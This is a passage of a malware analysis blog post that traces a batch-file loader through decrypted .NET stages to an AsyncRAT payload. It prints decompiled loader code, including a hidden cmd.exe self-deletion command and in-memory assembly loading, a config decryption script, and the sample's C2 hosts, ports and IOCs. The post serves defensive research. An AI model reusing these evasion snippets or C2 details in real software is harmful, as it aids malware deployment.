+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="k">private</span> <span class="k">static</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">JLUpOCopNzUYcmWAAVqD</span><span class="p">(</span><span class="kt">byte</span><span class="p">[]</span> <span class="n">input</span><span class="p">,</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">key</span><span class="p">,</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">AesManaged</span> <span class="n">aesManaged</span> <span class="p">=</span> <span class="k">new</span> <span class="n">AesManaged</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="n">aesManaged</span><span class="p">.</span><span class="n">Mode</span> <span class="p">=</span> <span class="n">CipherMode</span><span class="p">.</span><span class="n">CBC</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">aesManaged</span><span class="p">.</span><span class="n">Padding</span> <span class="p">=</span> <span class="n">PaddingMode</span><span class="p">.</span><span class="n">PKCS7</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">ICryptoTransform</span> <span class="n">cryptoTransform</span> <span class="p">=</span> <span class="n">aesManaged</span><span class="p">.</span><span class="n">CreateDecryptor</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">byte</span><span class="p">[]</span> <span class="n">result</span> <span class="p">=</span> <span class="n">cryptoTransform</span><span class="p">.</span><span class="n">TransformFinalBlock</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">input</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">cryptoTransform</span><span class="p">.</span><span class="n">Dispose</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="n">aesManaged</span><span class="p">.</span><span class="n">Dispose</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The function requires three inputs: the encrypted data, the encryption key, and the IV used. Let&rsquo;s look at one of those Base64 encoded strings. Here&rsquo;s an example of one of them, <code>string3</code>, from the payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="kt">string</span> <span class="n">string3</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">GHWUNYrBAxDKZVQXTPVw</span><span class="p">.</span><span class="n">JLUpOCopNzUYcmWAAVqD</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s">&#34;L8006VxAvUJWzfAIOh+ZOH00Qe/YxoxOrFpHtJy3/UOVT2yq67ZuD4LcAxZIXIgF&#34;</span><span class="p">),</span> <span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s">&#34;sQrHLi/0gExPoKi9yO28ivYTUynWIVpPG22IRqfJx6w=&#34;</span><span class="p">),</span> <span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s">&#34;RpkCR0LI6VjRRmO7+dtGHA==&#34;</span><span class="p">)));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If we look closely, we can see mention of the <code>JLUpOCopNzUYcmWAAVqD</code> encryption function; it also looks like it is providing the three inputs required for the function, just in Base64 format. In this instance, that would mean that the <code>L8006VxAvUJWzfAIOh+ZOH00Qe/YxoxOrFpHtJy3/UOVT2yq67ZuD4LcAxZIXIgF</code> encoded value is the encrypted text, the <code>sQrHLi/0gExPoKi9yO28ivYTUynWIVpPG22IRqfJx6w=</code> encoded text is the encryption key, and <code>RpkCR0LI6VjRRmO7+dtGHA==</code> is the encoded IV.</p>
+<p>With these values, we can manually decrypt the encrypted payload to see what is there. <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener noreffer ">CyberChef</a> is an excellent tool to do this. We need to start with Base64-decoding the input string, then using the AES Decrypt function, with the appropriate key and IV, to decrypt the payload. All of that plugged into CyberChef will look like the following:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/d179b655789b52f0f2055366d26c3c9d7af499a6.png"
+        data-srcset="/images/d179b655789b52f0f2055366d26c3c9d7af499a6.png, /images/d179b655789b52f0f2055366d26c3c9d7af499a6.png 1.5x, /images/d179b655789b52f0f2055366d26c3c9d7af499a6.png 2x"
+        data-sizes="auto"
+        alt="/images/d179b655789b52f0f2055366d26c3c9d7af499a6.png"
+        title="/images/d179b655789b52f0f2055366d26c3c9d7af499a6.png" /></p>
+<p>The encrypted text was successfully decrypted! The decrypted content is the following: <code>/c choice /c y /n /d y /t 1 &amp; attrib -h -s &quot;</code>. Based on the code where this string is used, the above effectively means that a <code>cmd.exe</code> process will be used to first sleep for a second (due to the <code>choice</code> command, which is a very common technique used by threat actors to sleep payloads for X seconds) and then modify the payload to remove the hidden and system attributes. Below is the code where this occurs, which also shows us that the <code>cmd.exe</code> process then deletes the payload file, likely in an attempt to hide its tracks:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="k">new</span> <span class="n">ProcessStartInfo</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">Arguments</span> <span class="p">=</span> <span class="kt">string</span><span class="p">.</span><span class="n">Concat</span><span class="p">(</span><span class="k">new</span> <span class="kt">string</span><span class="p">[]</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">string3</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="n">fileName</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;\&#34; &amp; del \&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="n">fileName</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;\&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}),</span>
+</span></span><span class="line"><span class="cl">	<span class="n">WindowStyle</span> <span class="p">=</span> <span class="n">ProcessWindowStyle</span><span class="p">.</span><span class="n">Hidden</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="n">CreateNoWindow</span> <span class="p">=</span> <span class="k">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="n">FileName</span> <span class="p">=</span> <span class="s">&#34;cmd.exe&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There are quite a few strings in the payload that go through this decryption process so, like before, why not let dnSpy do the heavy lifting?</p>
+<p>By running the dnSpy Debugger, and breaking at the entry point, we can follow the execution process and see the decrypted values as they are decrypted. While doing this on my VM, every run of dnSpy ended on line 125, which appears to make the program hang until killed. This is likely due to anti-debugging techniques in the payload, but at this point in the execution, we have what we need next.</p>
+<p>In this instance, the most important part of this payload is the <code>rawAssembly</code> variable. Once this is decrypted, it produces a large byte array of data that is set to be loaded into the process with the <code>Assembly.Load</code> method, similar to the previous PowerShell payload. This makes the <code>rawAssembly</code> content a potentially valuable piece of the puzzle.</p>
+<p>Once the variable has been decrypted in dnSpy, simply right-clicking on the value and clicking &ldquo;Save&rdquo; will let us output the contents of the byte array to a file.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/96c89b4eb96595612b49bdd2076e8994c8e70525.png"
+        data-srcset="/images/96c89b4eb96595612b49bdd2076e8994c8e70525.png, /images/96c89b4eb96595612b49bdd2076e8994c8e70525.png 1.5x, /images/96c89b4eb96595612b49bdd2076e8994c8e70525.png 2x"
+        data-sizes="auto"
+        alt="/images/96c89b4eb96595612b49bdd2076e8994c8e70525.png"
+        title="/images/96c89b4eb96595612b49bdd2076e8994c8e70525.png" /></p>
+<p>Let&rsquo;s take a look at what this file is with the ever useful <code>file</code> command.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1e5697af9d4d4f7275b418d1cb45203b9b3cc0db.png"
+        data-srcset="/images/1e5697af9d4d4f7275b418d1cb45203b9b3cc0db.png, /images/1e5697af9d4d4f7275b418d1cb45203b9b3cc0db.png 1.5x, /images/1e5697af9d4d4f7275b418d1cb45203b9b3cc0db.png 2x"
+        data-sizes="auto"
+        alt="/images/1e5697af9d4d4f7275b418d1cb45203b9b3cc0db.png"
+        title="/images/1e5697af9d4d4f7275b418d1cb45203b9b3cc0db.png" /></p>
+<p>Another .NET binary! Let&rsquo;s open this one up in dnSpy as well.</p>
+<h2 id="final-payload">Final Payload</h2>
+<p>Upon loading this into dnSpy, I can immediately tell that this is an AsyncRAT payload. This is due to the the assembly being named &ldquo;AsyncClient&rdquo;, which is the internal name for the AsyncRAT payloads, as well as the formattting of the <code>Settings</code> class.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/76be559b12332b8ee8660620e2598c76339c678b.png"
+        data-srcset="/images/76be559b12332b8ee8660620e2598c76339c678b.png, /images/76be559b12332b8ee8660620e2598c76339c678b.png 1.5x, /images/76be559b12332b8ee8660620e2598c76339c678b.png 2x"
+        data-sizes="auto"
+        alt="/images/76be559b12332b8ee8660620e2598c76339c678b.png"
+        title="/images/76be559b12332b8ee8660620e2598c76339c678b.png" /></p>
+<p>AsyncRAT encrypts configuration data, such as C2 server names, ports, pastebin configuration settings, etc, in its settings. The encryption key is also located in this Settings class, giving us everything we need to decrypt the configuration. I was able to find a nice Python script in an article on <a href="https://eln0ty.github.io/malware%20analysis/asyncRAT/#config-decryption" target="_blank" rel="noopener noreffer ">eln0ty&rsquo;s blog</a> that allows for an easy way to decrypt AsyncRAT configs. All we need to do is replace the <code>key</code> variable, as well as all of the <code>config</code> items with the values in our sample. Below is a copy of the script containing the necessary values for our sample:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="c1"># 1) use PBKDF2 to derive the decryption key and initialization key used for sha</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 2) calculate sha256 of data[32:] and compare it to the embedded sha256 hash (data[:32]) (We don&#39;t care here)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 3) iv = data[32:48]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 4) aes_dec(key, iv, data[48:])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># pip install backports.pbkdf2</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># pip install malduck</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">backports.pbkdf2</span> <span class="kn">import</span> <span class="n">pbkdf2_hmac</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">malduck</span> <span class="kn">import</span> <span class="n">aes</span><span class="p">,</span> <span class="n">unpad</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">salt</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbf\xeb\x1e\x56\xfb\xcd\x97\x3b\xb2\x19\x02\x24\x30\xa5\x78\x43\x00\x3d\x56\x44\xd2\x1e\x62\xb9\xd4\xf1\x80\xe7\xe6\xc3\x39\x41</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;ejFjc0p0QWtudENHVTdsakhjTExYbm1KM1RqbTVUMlA=&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">config</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Ports&#34;</span><span class="p">:</span> <span class="s2">&#34;UGCInR8TOWCBkQI6fVXrRZ4Yj+b4OvMqcvbx3n2pTLIpcwWtvmX+PX6uN7uIsx65cuUHbVopkDdPuRbLHd6jfg==&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Hosts&#34;</span><span class="p">:</span> <span class="s2">&#34;k/33hCqQ1vnvaz3j8VvjdZRXF/poiYruJfX1WbFuFhwXYuNriBFrqyi0fQfk4xN0LS85PC6oOtCuLYarjJSnLsoDQGhIWf6+CTyT0wNgZOg=&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Version&#34;</span><span class="p">:</span> <span class="s2">&#34;WG0EkFzynw3wCeMtt128RLUZgT6BSNw7pqLDg9XUMRmpx5WpQw1ZN64GLHYrP/h47iM2KImVVeY0wAT1RqMVVg==&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Install&#34;</span><span class="p">:</span> <span class="s2">&#34;3/TL2kdA5ptdHUR1gfeiPmkurKrJsw3BjJ7njALFi+ouT64Tx5oE1P7U7NktNpWfBZVmmjxeR/xSyR14NdEPcw==&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;MTX&#34;</span><span class="p">:</span> <span class="s2">&#34;7vyshlirEg6SwhKPRttI85LoRXYLoFWLzaDM4h57MqKcy9iihijskYVbiDhhZu5qzqRxMBX5DpJ6dAfancdQ8cqHklNaopJNiz3/ZgGt2BI=&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Anti&#34;</span><span class="p">:</span> <span class="s2">&#34;fvHzWJyCKwkBHk/dOoyPPC5w+F3GyNg0t7NAj8VXjA2b0ntbSqH11xvQACf2jGX7VSLAd6BjykqqQIJAb98Veg==&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Pastebin&#34;</span><span class="p">:</span> <span class="s2">&#34;B52OeJUAfsMHW3Ea2wBUni41OckwUyCtHz3yHsDSn9XjE4U+ncvS0Kmik61ZnDWTm+oNBPoQaDb5PHqfInPGXQ==&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;BDOS&#34;</span><span class="p">:</span> <span class="s2">&#34;++zHWqz0o5rkma5tjGrmNMSXzvLTZVOFmlOz4lhTPTPejjFLjqH/rhhciAYgm+Mq5bOazkPYeFGYC8q5I47wVA==&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Group&#34;</span><span class="p">:</span> <span class="s2">&#34;fwbqIWwfsG6vrljdbLznhYHm5g+qylXiJVparVYZ5s61hXK84/sQMNn6fTH09rZ+MeWdbYV1AhcKtEpQzJ6I5g==&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">dec_key</span> <span class="o">=</span> <span class="n">pbkdf2_hmac</span><span class="p">(</span><span class="s2">&#34;sha1&#34;</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="mi">50000</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">config</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">iv</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">32</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decrypted</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">aes</span><span class="o">.</span><span class="n">cbc</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">dec_key</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="mi">48</span><span class="p">:]))</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">{}</span><span class="s2">: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">decrypted</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Running the script gives us the cleartext configuration settings for this AsyncRAT sample!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Ports: 6606,7707,8808
+</span></span><span class="line"><span class="cl">Hosts: churchmon.ddns.net,churchmon21.ddns.net,churchmon22.ddns.net
+</span></span><span class="line"><span class="cl">Version: 0.5.7B
+</span></span><span class="line"><span class="cl">Install: false
+</span></span><span class="line"><span class="cl">MTX: AsyncMutex_6SI8OkPnk
+</span></span><span class="line"><span class="cl">Anti: false
+</span></span><span class="line"><span class="cl">Pastebin: null
+</span></span><span class="line"><span class="cl">BDOS: false
+</span></span><span class="line"><span class="cl">Group: Default
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="so-infection-vector">So&hellip; Infection Vector?</h2>
+<p>After analyzing this malware sample, I did some Googling to see if I can find more information on it. I stumbled across a tweet from <a href="https://twitter.com/Unit42_Intel/status/1620090792088932352" target="_blank" rel="noopener noreffer ">Unit42</a> and a blog post from <a href="https://www.rapid7.com/blog/post/2023/01/31/rapid7-observes-use-of-microsoft-onenote-to-spread-redline-infostealer-malware/" target="_blank" rel="noopener noreffer ">Rapid7</a> with similar looking samples. In these cases, it appears that Redline Stealer was the final payload, but the infection process was pretty much exactly the same; the Rapid7 blog also mentions that they have also seen AsyncRAT payloads being used with this method. The articles outline a relatively new technique being used by threat actors where they use OneNote files to deliver malicious payloads. Based on this information, I strongly believe that this batch file payload originated from within a OneNote file used by the (currently) unknown threat actor in this campaign.</p>
+<p>Thanks for reading!!</p>
+<h1 id="iocs">IOCs</h1>
+<h2 id="files">Files</h2>
+<table>
+<thead>
+<tr>
+<th><strong>Filename</strong></th>
+<th><strong>SHA256 Hash</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>payload.bat</td>
+<td>a15f29572a149a04d45b8c01daa047ec9f517077a507f8d53ac9b8a8ceed4a34</td>
+</tr>
+<tr>
+<td>loader.exe</td>
+<td>542d0b1b95f943e9718082c790141b156812f851b9f9dc9445d57653486a6702</td>
+</tr>
+<tr>
+<td>AsyncRAT.exe</td>
+<td>97e6c937b6768d111c4a94bd993c04cb4069da146423ea69d2af20d301057295</td>
+</tr>
+</tbody>
+</table>
+<h2 id="domains">Domains</h2>
+<table>
+<thead>
+<tr>
+<th><strong>Domain</strong></th>
+<th><strong>IP Address</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>churchmon.ddns.net</td>
+<td>89.117.21.144</td>
+</tr>
+<tr>
+<td>churchmon21.ddns.net</td>
+<td>N/A</td>
+</tr>
+<tr>
+<td>churchmon22.ddns.net</td>
+<td>N/A</td>
+</tr>
+</tbody>
+</table>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-02-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://misthi0s.github.io/posts/2023-02-08-from-bat-to-asyncrat/" data-title="From BAT to AsyncRAT" data-via="_misthi0s" data-hashtags="malware,.net,bat,powershell,AsyncRAT"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://misthi0s.github.io/posts/2023-02-08-from-bat-to-asyncrat/" data-hashtag="malware"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://misthi0s.github.io/posts/2023-02-08-from-bat-to-asyncrat/" data-title="From BAT to AsyncRAT"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://misthi0s.github.io/posts/2023-02-08-from-bat-to-asyncrat/" data-title="From BAT to AsyncRAT"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://misthi0s.github.io/posts/2023-02-08-from-bat-to-asyncrat/" data-title="From BAT to AsyncRAT"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/malware/">malware</a>,&nbsp;<a href="/tags/.net/">.net</a>,&nbsp;<a href="/tags/bat/">bat</a>,&nbsp;<a href="/tags/powershell/">powershell</a>,&nbsp;<a href="/tags/asyncrat/">AsyncRAT</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.110.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
